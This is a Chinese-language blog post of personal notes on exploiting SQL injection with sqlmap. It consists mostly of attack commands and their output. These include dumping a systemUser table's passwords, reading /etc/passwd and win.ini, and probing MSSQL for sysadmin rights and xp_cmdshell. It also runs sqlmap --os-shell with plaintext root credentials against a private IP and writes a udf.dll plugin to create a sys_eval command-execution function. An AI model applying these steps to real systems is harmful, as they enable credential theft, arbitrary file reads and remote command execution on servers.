---
layout: post
toc: true
title: "「SQL注入」:SQL-SHELL"
author: Bin4xin
categories:
    - blog
    - 漏洞复现
    - 笔记
    - CVE
    - Sql-Inject
permalink: /blog/2020/SQL/SHELL/
---


### sqlmap注入方法

```bash

sqlmap -r Desktop/uid.txt --current-user

sqlmap -r Desktop/uid.txt -D aiweb1 --tables

sqlmap -r Desktop/uid.txt -D aiweb1 -T systemUser --columns

sqlmap -r Desktop/uid.txt -D aiweb1 -T systemUser -C id,password,userName

sqlmap -r Desktop/uid.txt --file-read="/etc/passwd"

sql-shell> select load_file('/etc/passwd')

```

```bash
查看数据库信息和系统版本
sql-shell> select @@version
[14:29:22] [INFO] fetching SQL SELECT statement query output: 'select @@version'
select @@version:    'Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) \n\tApr  2 2010 15:48:46 \n\tCopyright (c) Microsoft Corporation\n\tStandard Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)\n'

验证是否为sa权限
sql-shell> select IS_SRVROLEMEMBER('sysadmin')
[14:30:08] [INFO] fetching SQL SELECT statement query output: 'select IS_SRVROLEMEMBER('sysadmin')'
select IS_SRVROLEMEMBER('sysadmin'):    '1'

判断目标机的MSSQL服务是否存在`xp_cmdshell`扩展存储过程：
sql-shell> select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';
[14:31:00] [INFO] fetching SQL SELECT statement query output: 'select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell''
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';:    '1'
只要返回结果不是`0`就说明存在`xp_cmdshell`扩展存储过程。
```
### 遇到问题

```bash
sql-shell> Exec master..xp_cmdshell 'whoami';
[14:32:58] [WARNING] execution of non-query SQL statements is only available when stacked queries are supported
```



### how
sqlmap -r /home/tool/sqlmap-data/wsdl-inject/net-test1.txt --batch --file-read="C:\Windows\win.ini"
```bash
[14:24:08] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2008 R2 or 7
web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NET
back-end DBMS: Microsoft SQL Server 2008
[14:24:08] [ERROR] none of the SQL injection techniques detected can be used to read files from the underlying file system of the back-end Microsoft SQL Server server
```

### ?os-shell?
mysql:
select password(''),concat('*',sha1(unhex(sha1(''))));
sqlmap -d "mysql://root:Hehe123456@192.168.192.120:3306/test" --os-shell





```bash
select "hex" into outfile "D:/phpStudy/MySQL/lib/plugin/udf.dll"
```

CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
